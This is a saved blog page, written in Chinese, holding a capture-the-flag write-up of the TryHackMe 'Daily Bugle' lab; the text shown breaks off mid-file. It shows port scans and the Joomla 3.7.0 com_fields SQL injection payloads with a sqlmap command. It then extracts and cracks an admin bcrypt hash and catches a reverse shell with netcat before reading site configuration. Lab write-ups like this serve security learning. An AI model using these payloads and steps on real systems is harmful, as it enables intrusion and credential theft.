@@ -1,0 +1,676 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="123456789101112131415161718192021222324252627282930313233Crazyinside:~&#x2F;HTB$ sudo masscan -p1-65535,U1-65535 10.10.163.61 --rate 2000 -e tun0[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tryhackme-Daily Bugle">
+<meta property="og:url" content="http://example.com/2022/10/06/Tryhackme-Daily-Bugle/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="123456789101112131415161718192021222324252627282930313233Crazyinside:~&#x2F;HTB$ sudo masscan -p1-65535,U1-65535 10.10.163.61 --rate 2000 -e tun0[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220721103755437.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220721110803049.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.877Z">
+<meta property="article:modified_time" content="2022-07-21T09:12:57.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220721103755437.png">
+  
+  
+  
+  <title>Tryhackme-Daily Bugle - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Tryhackme-Daily Bugle"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          105 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Tryhackme-Daily Bugle</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ sudo masscan -p1-65535,U1-65535 10.10.163.61 --rate 2000 -e tun0<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-07-21 01:20:19 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [65535 ports/host]<br>Discovered open port 3306/tcp on 10.10.163.61                                  <br>Discovered open port 22/tcp on 10.10.163.61                                    <br>Discovered open port 80/tcp on 10.10.163.61                                    <br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ sudo nmap -sC -sV 10.10.163.61 -oN Daily -p3306,22,80 -Pn -T4         <br>Starting Nmap 7.92SVN ( https://google.com ) at 2022-07-21 09:23 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.163.61<br>Host is up (0.35s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)<br>|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)<br>|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)<br>|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40<br>|_http-title: Home<br>|_http-generator: Joomla! - Open Source Content Management<br>| http-robots.txt: 15 disallowed entries <br>| /joomla/administrator/ /administrator/ /bin/ /cache/ <br>| /cli/ /components/ /includes/ /installation/ /language/ <br>|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/<br>3306/tcp open  mysql   MariaDB (unauthorized)<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.21 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.163.61 -oN Daily -p3306,22,80 -Pn -T4<br></code></pre></td></tr></table></figure>
+
+<p>joomla可以用joomscan扫描探测一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>    ____  _____  _____  __  __  ___   ___    __    _  _ <br>   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )<br>  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( <br>  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)<br>                        (1337.today)<br>   <br>    --=[OWASP JoomScan<br>    +---++---==[Version : 0.0.7<br>    +---++---==[Update Date : [2018/09/23]<br>    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo<br>    --=[Code name : Self Challenge<br>    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP<br><br>Processing http://10.10.163.61 ...<br><br><br><br>[+] FireWall Detector<br>[++] Firewall not detected<br><br>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0<br><br>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable<br><br>[+] Checking Directory Listing<br>[++] directory has directory listing : <br>http://10.10.163.61/administrator/components<br>http://10.10.163.61/administrator/modules<br>http://10.10.163.61/administrator/templates<br>http://10.10.163.61/images/banners<br><br><br>[+] Checking apache info/status files<br>[++] Readable info/status files are not found<br><br>[+] admin finder<br>[++] Admin page : http://10.10.163.61/administrator/<br><br>[+] Checking robots.txt existing<br>[++] robots.txt is found<br>path : http://10.10.163.61/robots.txt <br><br>Interesting path found from robots.txt<br>http://10.10.163.61/joomla/administrator/<br>http://10.10.163.61/administrator/<br>http://10.10.163.61/bin/<br>http://10.10.163.61/cache/<br>http://10.10.163.61/cli/<br>http://10.10.163.61/components/<br>http://10.10.163.61/includes/<br>http://10.10.163.61/installation/<br>http://10.10.163.61/language/<br>http://10.10.163.61/layouts/<br>http://10.10.163.61/libraries/<br>http://10.10.163.61/logs/<br>http://10.10.163.61/modules/<br>http://10.10.163.61/plugins/<br>http://10.10.163.61/tmp/<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ searchsploit Joomla 3.7.0              <br>------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                      |  Path<br>------------------------------------------------------------------------------------ ---------------------------------<br>Joomla! 3.7.0 - <span class="hljs-string">&#x27;com_fields&#x27;</span> SQL Injection                                          | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                       | php/webapps/43488.txt<br>------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>                                                                                                                      <br>Crazyinside:~/HTB$ searchsploit -m php/webapps/42033.txt<br>  Exploit: Joomla! 3.7.0 - <span class="hljs-string">&#x27;com_fields&#x27;</span> SQL Injection<br>      URL: https://www.exploit-db.com/exploits/42033<br>     Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt<br>File Type: ASCII text<br><br>Copied to: /home/crazyinside/HTB/42033.txt<br><br><br>                                                                                                                      <br>Crazyinside:~/HTB$ <span class="hljs-built_in">cat</span> 42033.txt             <br><span class="hljs-comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="hljs-comment"># Date: 05-19-2017</span><br><span class="hljs-comment"># Exploit Author: Mateus Lino</span><br><span class="hljs-comment"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><br><span class="hljs-comment"># Vendor Homepage: https://www.joomla.org/</span><br><span class="hljs-comment"># Version: = 3.7.0</span><br><span class="hljs-comment"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="hljs-comment"># CVE : - CVE-2017-8917</span><br><br><br>URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27<br><br><br>Using Sqlmap:<br><br>sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br><br>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)<br><br>    Type: error-based<br>    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)<br><br>    Type: AND/OR time-based blind<br>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)<br></code></pre></td></tr></table></figure>
+
+<p>布尔注入太慢了。有另一种替代方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ python2 joomblah.py http://10.10.163.61                                                         1 ⨯<br>                                                                                                                    <br>    .---.    .-<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;-.        .-&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>-.                                                           <br>    |   |   <span class="hljs-string">&#x27;   _    \     &#x27;</span>   _    \                            .---.                        <br>    <span class="hljs-string">&#x27;---&#x27;</span> /   /` <span class="hljs-string">&#x27;.   \  /   /` &#x27;</span>.   \  __  __   ___   /|        |   |            .           <br>    .---..   |     \  <span class="hljs-string">&#x27; .   |     \  &#x27;</span> |  |/  `.<span class="hljs-string">&#x27;   `. ||        |   |          .&#x27;</span>|           <br>    |   ||   <span class="hljs-string">&#x27;      |  &#x27;</span>|   <span class="hljs-string">&#x27;      |  &#x27;</span>|   .-.  .-.   <span class="hljs-string">&#x27;||        |   |         &lt;  |           </span><br><span class="hljs-string">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           </span><br><span class="hljs-string">    |   | `.   ` ..&#x27;</span> /   `.   ` ..<span class="hljs-string">&#x27; /  |  |  |  |  |  |||/&#x27;</span>__ <span class="hljs-string">&#x27;. |   | .:--.&#x27;</span>.  | | .<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;-.    </span><br><span class="hljs-string">    |   |    &#x27;</span>-...-<span class="hljs-string">&#x27;`       &#x27;</span>-...-<span class="hljs-string">&#x27;`   |  |  |  |  |  ||:/`  &#x27;</span>. <span class="hljs-string">&#x27;|   |/ |   \ | | |/.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>. \   <br>    |   |                              |  |  |  |  |  |||     | ||   |`<span class="hljs-string">&quot; __ | | |  /    | |   </span><br><span class="hljs-string">    |   |                              |__|  |__|  |__|||\    / &#x27;|   | .&#x27;.&#x27;&#x27;| | | |     | |   </span><br><span class="hljs-string"> __.&#x27;   &#x27;                                              |/&#x27;..&#x27; / &#x27;---&#x27;/ /   | |_| |     | |   </span><br><span class="hljs-string">|      &#x27;                                               &#x27;  `&#x27;-&#x27;`       \ \._,\ &#x27;/| &#x27;.    | &#x27;.  </span><br><span class="hljs-string">|____.&#x27;                                                                `--&#x27;  `&quot;</span> <span class="hljs-string">&#x27;---&#x27;</span>   <span class="hljs-string">&#x27;---&#x27;</span> <br><br> [-] Fetching CSRF token<br> [-] Testing SQLi<br>  -  Found table: fb9j5_users<br>  -  Extracting <span class="hljs-built_in">users</span> from fb9j5_users<br> [$] Found user [<span class="hljs-string">&#x27;811&#x27;</span>, <span class="hljs-string">&#x27;Super User&#x27;</span>, <span class="hljs-string">&#x27;jonah&#x27;</span>, <span class="hljs-string">&#x27;jonah@tryhackme.com&#x27;</span>, <span class="hljs-string">&#x27;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]<br>  -  Extracting sessions from fb9j5_session<br>                                                                                                                       <br>Crazyinside:~/HTB$ hashid<br>$2y$10<span class="hljs-variable">$0veO</span>/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm<br>Analyzing <span class="hljs-string">&#x27;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#x27;</span><br>[+] Blowfish(OpenBSD) <br>[+] Woltlab Burning Board 4.x <br>[+] bcrypt <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ hashcat -h | grep bcrypt                                                                      130 ⨯<br>   3200 | bcrypt <span class="hljs-variable">$2</span>*$, Blowfish (Unix)                        | Operating System<br>  25600 | bcrypt(md5(<span class="hljs-variable">$pass</span>)) / bcryptmd5                      | Forums, CMS, E-Commerce<br>  25800 | bcrypt(sha1(<span class="hljs-variable">$pass</span>)) / bcryptsha1                    | Forums, CMS, E-Commerce<br>                                                                                                                       <br>Crazyinside:~/HTB$ hashcat -m 3200 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt <br>hashcat (v6.2.5) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>============================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 6857/13779 MB (2048 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 72<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Single-Hash<br>* Single-Salt<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Initializing backend runtime <span class="hljs-keyword">for</span> device <span class="hljs-comment">#1. Please be patient...</span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">$2y$10<span class="hljs-variable">$0veO</span>/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 3200 (bcrypt <span class="hljs-variable">$2</span>*$, Blowfish (Unix))<br>Hash.Target......: $2y$10<span class="hljs-variable">$0veO</span>/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm<br>Time.Started.....: Thu Jul 21 09:55:45 2022 (8 mins, 23 secs)<br>Time.Estimated...: Thu Jul 21 10:04:08 2022 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:       92 H/s (2.67ms) @ Accel:8 Loops:32 Thr:1 Vec:1</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 46840/14344385 (0.33%)<br>Rejected.........: 0/46840 (0.00%)<br>Restore.Point....: 46832/14344385 (0.33%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:992-1024</span><br>Candidate.Engine.: Device Generator<br>Candidates.<span class="hljs-comment">#1....: staffy -&gt; sorriso</span><br>Hardware.Mon.<span class="hljs-comment">#1..: Temp: 72c Util: 82%</span><br><br>Started: Thu Jul 21 09:55:02 2022<br>Stopped: Thu Jul 21 10:04:10 2022<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220721103755437.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220721103755437"></p>
+<p>写入反弹shell的代码点击模板预览即可加载执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.14.24.91] from (UNKNOWN) [10.10.163.61] 42652<br>Linux dailybugle 3.10.0-1062.el7.x86_64 <span class="hljs-comment">#1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br> 22:52:39 up  1:33,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.01, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=48(apache) gid=48(apache) <span class="hljs-built_in">groups</span>=48(apache)<br>sh: no job control <span class="hljs-keyword">in</span> this shell<br>sh-4.2$ <br></code></pre></td></tr></table></figure>
+
+<p>joomla需要配备数据库，最开始目标也扫出了3306.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">cat</span> configuration.php <br>&lt;?php<br>class JConfig &#123;<br>        public <span class="hljs-variable">$offline</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$offline_message</span> = <span class="hljs-string">&#x27;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#x27;</span>;<br>        public <span 